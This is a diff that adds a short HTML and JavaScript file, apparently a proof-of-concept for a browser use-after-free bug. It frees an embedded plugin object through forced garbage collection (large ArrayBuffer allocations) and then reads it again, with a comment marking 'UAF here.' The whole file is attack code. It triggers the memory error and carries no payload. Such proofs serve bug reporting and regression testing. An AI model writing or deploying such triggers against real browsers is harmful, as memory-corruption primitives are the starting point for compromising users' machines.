@@ -1,0 +1,27 @@
+<script>
+    var worker = null;
+    function start()
+    {
+        worker = document.getElementById("worker");
+        window.top.document.getElementById("cur").addEventListener("DOMNodeInserted", callback0);
+        var intl = setInterval(function(){
+            worker.GetURL.a = 777;
+            window.top.f();
+            clearInterval(intl);
+        }, 1);
+    }
+    function callback0(ev) {
+        window.requestAnimationFrame(callback);
+    }
+    function gc() {
+        for (let i = 0; i < 0x40; i++) { new ArrayBuffer(0x1000000); }
+    }
+    function callback(ev) {
+        gc();
+        alert(worker.GetURL.a); // UAF here.
+    }
+    </script>
+    <body onload="start();">
+    <embed id="worker" src="data:video/mp4;"></embed>
+    </body>
+    
